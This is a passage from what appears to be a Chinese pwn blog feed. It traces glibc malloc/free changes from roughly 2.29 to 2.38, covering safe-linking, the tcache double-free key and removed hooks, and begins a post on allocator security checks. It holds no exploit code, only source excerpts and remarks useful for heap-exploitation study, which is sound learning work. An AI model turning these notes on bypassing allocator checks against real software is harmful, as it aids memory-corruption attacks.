class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz) \</span></span><br><span class="line"><span class="meta">(&#123;    \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);    \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((sz) &lt; (req))    \</span></span><br><span class="line"><span class="meta">      || REQUEST_OUT_OF_RANGE (sz)) \</span></span><br><span class="line"><span class="meta">    &#123;    \</span></span><br><span class="line"><span class="meta">      __set_errno (ENOMEM);    \</span></span><br><span class="line"><span class="meta">      return 0;    \</span></span><br><span class="line"><span class="meta">    &#125;    \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span></span><br><span class="line"><span class="title function_">checked_request2size</span> <span class="params">(<span class="type">size_t</span> req, <span class="type">size_t</span> *sz)</span> __<span class="title function_">nonnull</span> <span class="params">(<span class="number">1</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (req &gt; PTRDIFF_MAX))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  *sz = request2size (req);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>宏checked_request2size现在由函数实现</p><h2 id="free-3"><a href="#free-3" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-3"><a href="#libc-free-3" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-3"><a href="#int-free-3" class="headerlink" title="__int_free"></a>__int_free</h3><p>无显著变化</p><h2 id="附属-3"><a href="#附属-3" class="headerlink" title="附属"></a>附属</h2><p>无显著变化</p><h1 id="glibc2-32"><a href="#glibc2-32" class="headerlink" title="glibc2.32"></a>glibc2.32</h1><h2 id="malloc-4"><a href="#malloc-4" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-4"><a href="#libc-malloc-4" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-4"><a href="#int-malloc-4" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><h4 id="fastbin-3"><a href="#fastbin-3" class="headerlink" title="fastbin"></a>fastbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pp = REVEAL_PTR (victim-&gt;fd);</span><br></pre></td></tr></table></figure><p>新增取出时fastbin chunk解密</p><h2 id="free-4"><a href="#free-4" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-4"><a href="#libc-free-4" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-4"><a href="#int-free-4" class="headerlink" title="__int_free"></a>__int_free</h3><h4 id="tcache-4"><a href="#tcache-4" class="headerlink" title="tcache"></a>tcache</h4><p>判断tcache double free时需要解密</p><h4 id="fastbin-4"><a href="#fastbin-4" class="headerlink" title="fastbin"></a>fastbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br></pre></td></tr></table></figure><p>放入fastbin时需加密</p><h2 id="附属-4"><a href="#附属-4" class="headerlink" title="附属"></a>附属</h2><h3 id="tcache-amp-amp-fastbin加密"><a href="#tcache-amp-amp-fastbin加密" class="headerlink" title="tcache&amp;&amp;fastbin加密"></a>tcache&amp;&amp;fastbin加密</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span></span><br><span class="line"><span class="comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>tcache和fastbin新增链表加密</p><p>加密的具体方法是:<strong>取chunk的fd字段(next字段)的地址右移12位,再与要加密的数据异或</strong>,得到结果</p><p>解密则是与加密恰好相反</p><hr><p>并且可以发现:</p><p>对于一条fastbin或tcachebin单链表,从链表头看起,他的第一个chunk成员是不加密的,只有从第二个开始才会进行加密</p><h3 id="tcache-5"><a href="#tcache-5" class="headerlink" title="tcache"></a>tcache</h3><h4 id="tcache-put-2"><a href="#tcache-put-2" class="headerlink" title="tcache_put"></a>tcache_put</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br></pre></td></tr></table></figure><p>放入tcache时加密</p><h4 id="tcache-get-2"><a href="#tcache-get-2" class="headerlink" title="tcache_get"></a>tcache_get</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br></pre></td></tr></table></figure><p>tcache取出时解密</p><h1 id="glibc2-33"><a href="#glibc2-33" class="headerlink" title="glibc2.33"></a>glibc2.33</h1><h2 id="malloc-5"><a href="#malloc-5" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-5"><a href="#libc-malloc-5" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-5"><a href="#int-malloc-5" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><p>无显著变化</p><h2 id="free-5"><a href="#free-5" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-5"><a href="#libc-free-5" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-5"><a href="#int-free-5" class="headerlink" title="__int_free"></a>__int_free</h3><p>无显著变化</p><h2 id="附属-5"><a href="#附属-5" class="headerlink" title="附属"></a>附属</h2><h3 id="M-TAG"><a href="#M-TAG" class="headerlink" title="M_TAG"></a>M_TAG</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_MTAG</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default implementaions when memory tagging is supported, but disabled.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">__default_tag_region (<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">__default_tag_nop (<span class="type">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __mtag_mmap_flags = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> __mtag_granule_mask = ~(<span class="type">size_t</span>)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *(*__tag_new_memset)(<span class="type">void</span> *, <span class="type">int</span>, <span class="type">size_t</span>) = <span class="built_in">memset</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *(*__tag_region)(<span class="type">void</span> *, <span class="type">size_t</span>) = __default_tag_region;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *(*__tag_new_usable)(<span class="type">void</span> *) = __default_tag_nop;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *(*__tag_at)(<span class="type">void</span> *) = __default_tag_nop;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_NEW_MEMSET(ptr, val, size) __tag_new_memset (ptr, val, size)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_REGION(ptr, size) __tag_region (ptr, size)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_NEW_USABLE(ptr) __tag_new_usable (ptr)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_AT(ptr) __tag_at (ptr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_NEW_MEMSET(ptr, val, size) memset (ptr, val, size)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_REGION(ptr, size) (ptr)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_NEW_USABLE(ptr) (ptr)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_AT(ptr) (ptr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>新增M_TAG部分,不过基本为空</p><h1 id="glibc2-34"><a href="#glibc2-34" class="headerlink" title="glibc2.34"></a>glibc2.34</h1><h2 id="malloc-6"><a href="#malloc-6" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-6"><a href="#libc-malloc-6" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">-    = atomic_forced_read (__malloc_hook);</span><br><span class="line">-  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">-    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>去除了__malloc_hook符号及调用,其实所有相关hook都被去除了</p><h3 id="int-malloc-6"><a href="#int-malloc-6" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><p>无显著变化</p><h2 id="free-6"><a href="#free-6" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-6"><a href="#libc-free-6" class="headerlink" title="__libc_free"></a>__libc_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">  = atomic_forced_read (__free_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>去除了__free_hook符号及调用</p><h3 id="int-free-6"><a href="#int-free-6" class="headerlink" title="__int_free"></a>__int_free</h3><p>无显著变化</p><h2 id="附属-6"><a href="#附属-6" class="headerlink" title="附属"></a>附属</h2><h3 id="tcache-6"><a href="#tcache-6" class="headerlink" title="tcache"></a>tcache</h3><h4 id="key验证"><a href="#key验证" class="headerlink" title="key验证"></a>key验证</h4><p>以往key_entry结构体中用于验证double free的key字段是用tcache填充,现在改为用tcache_key填充</p><p>tcache_key的产生如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* Process-wide key to try and catch a double-free in the same thread.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> tcache_key;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The value of tcache_key does not really have to be a cryptographically</span></span><br><span class="line"><span class="comment">   secure random number.  It only needs to be arbitrary enough so that it does</span></span><br><span class="line"><span class="comment">   not collide with values present in applications.  If a collision does happen</span></span><br><span class="line"><span class="comment">   consistently enough, it could cause a degradation in performance since the</span></span><br><span class="line"><span class="comment">   entire list is checked to check if the block indeed has been freed the</span></span><br><span class="line"><span class="comment">   second time.  The odds of this happening are exceedingly low though, about 1</span></span><br><span class="line"><span class="comment">   in 2^wordsize.  There is probably a higher chance of the performance</span></span><br><span class="line"><span class="comment">   degradation being due to a double free where the first free happened in a</span></span><br><span class="line"><span class="comment">   different thread; that&#x27;s a case this check does not cover.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_key_initialize</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="M-TAG-1"><a href="#M-TAG-1" class="headerlink" title="M_TAG"></a>M_TAG</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_MTAG</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> mtag_enabled = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> mtag_mmap_flags = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> mtag_enabled false</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> mtag_mmap_flags 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tag_region</span> <span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    <span class="keyword">return</span> __libc_mtag_tag_region (ptr, size);</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tag_new_zero_region</span> <span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    <span class="keyword">return</span> __libc_mtag_tag_zero_region (__libc_mtag_new_tag (ptr), size);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span> (ptr, <span class="number">0</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Defined later.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tag_new_usable</span> <span class="params">(<span class="type">void</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tag_at</span> <span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    <span class="keyword">return</span> __libc_mtag_address_get_tag (ptr);</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>M_TAG实装了一部分,但依然没什么用</p><h1 id="glibc2-35"><a href="#glibc2-35" class="headerlink" title="glibc2.35"></a>glibc2.35</h1><h2 id="malloc-7"><a href="#malloc-7" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-7"><a href="#libc-malloc-7" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-7"><a href="#int-malloc-7" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><p>无显著变化</p><h2 id="free-7"><a href="#free-7" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-7"><a href="#libc-free-7" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-7"><a href="#int-free-7" class="headerlink" title="__int_free"></a>__int_free</h3><p>无显著变化</p><h2 id="附属-7"><a href="#附属-7" class="headerlink" title="附属"></a>附属</h2><p>无显著变化</p><h1 id="glibc2-37"><a href="#glibc2-37" class="headerlink" title="glibc2.37"></a>glibc2.37</h1><h2 id="malloc-8"><a href="#malloc-8" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-8"><a href="#libc-malloc-8" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-8"><a href="#int-malloc-8" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><p>无显著变化</p><h2 id="free-8"><a href="#free-8" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-8"><a href="#libc-free-8" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-8"><a href="#int-free-8" class="headerlink" title="__int_free"></a>__int_free</h3><p>无显著变化</p><h2 id="附属-8"><a href="#附属-8" class="headerlink" title="附属"></a>附属</h2><p>无显著变化</p><h1 id="glibc2-38"><a href="#glibc2-38" class="headerlink" title="glibc2.38"></a>glibc2.38</h1><h2 id="malloc-9"><a href="#malloc-9" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-9"><a href="#libc-malloc-9" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-9"><a href="#int-malloc-9" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><p>无显著变化</p><h2 id="free-9"><a href="#free-9" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-9"><a href="#libc-free-9" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-9"><a href="#int-free-9" class="headerlink" title="__int_free"></a>__int_free</h3><p>无显著变化</p><h2 id="附属-9"><a href="#附属-9" class="headerlink" title="附属"></a>附属</h2><h3 id="tcache-7"><a href="#tcache-7" class="headerlink" title="tcache"></a>tcache</h3><h4 id="tcache-get-3"><a href="#tcache-get-3" class="headerlink" title="tcache_get"></a>tcache_get</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get_n (tc_idx, &amp; tcache-&gt;entries[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tcache变为调用tcache_get_n (tc_idx, &amp; tcache-&gt;entries[tc_idx])</p><p>tcache_get_n的实现如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span> <span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e;</span><br><span class="line">  <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">    e = *ep;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    e = REVEAL_PTR (*ep);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">      *ep = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *ep = PROTECT_PTR (ep, REVEAL_PTR (e-&gt;next));</span><br><span class="line"></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的变化使得tcache可以从链中间取出chunk</p><p>不过对于tcache_get来说,实际上并没有什么变化</p>]]></content>
    
    
    <summary type="html">一些操作实现的不同</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="glibc" scheme="https://ixout.github.io/tags/glibc/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>malloc/free安全检查</title>
    <link href="https://ixout.github.io/posts/25293/"/>
    <id>https://ixout.github.io/posts/25293/</id>
    <published>2023-07-29T07:40:32.000Z</published>
    <updated>2024-01-11T15:15:31.984Z</updated>
    
    <content type="html"><![CDATA[<span class='p black'>在不同的glibc下</span><p>分为两篇,一篇记录安全检测,一篇记录操作变化</p><p><strong>需要注意,一个大版本下的libc还有许多小版本,版本不同libc也会存在差异,可能有些有检查有些没有</strong></p><p>这里以<a href="http://mirrors.nju.edu.cn/gnu/libc/">libc下载</a>网站下载的为准</p><p><strong>有些检查可能是在介绍的两个版本之间更新的,这里以只考虑比较经典的几个版本</strong></p><h1 id="glibc2-23"><a href="#glibc2-23" class="headerlink" title="glibc2.23"></a>glibc2.23</h1><p><strong>现在看来,2.23已经是一个比较老的版本了,比它更早的版本暂时不做关注,2.23是一个十分经典的版本,以它为基础先概览各类检查</strong></p><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">        ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br></pre></td></tr></table></figure><p>返回victim前的最后一个检查,需要满足以下三个条件中的至少一个:</p><ol><li>victim==NULL</li><li>chunk的mmap分配标志位为1</li><li>chunk的non_main_arena标志为0</li></ol><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><h4 id="mglobal-1"><a href="#mglobal-1" class="headerlink" title="mglobal-1"></a>mglobal-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;      \</span></span><br><span class="line"><span class="meta">      __set_errno (ENOMEM);      \</span></span><br><span class="line"><span class="meta">      return 0;      \</span></span><br><span class="line"><span class="meta">    &#125;      \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (req) &gt;=      \</span></span><br><span class="line"><span class="meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span></span><br></pre></td></tr></table></figure><p>_int_malloc初始会在checked_request2size (bytes, nb)中判断申请大小是否合规</p><p>如果在无符号比较中申请大小大于等于-2* MINSIZE,则会报错</p><blockquote><p>另外提一下,虽然在代码中是先判断申请大小是否越界,再将其转为实际申请chunk大小,但在大多数实际情况下,二者的顺序是倒过来的,即先转化再判断</p></blockquote><h4 id="mfastbin-1"><a href="#mfastbin-1" class="headerlink" title="mfastbin-1"></a>mfastbin-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>取出fastbin中的chunk时,通过该chunk计算出的fastbin索引是否与该chunk所在的链的索引相同,即大小是否对应</p><h4 id="msmallbin-1"><a href="#msmallbin-1" class="headerlink" title="msmallbin-1"></a>msmallbin-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">             bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">           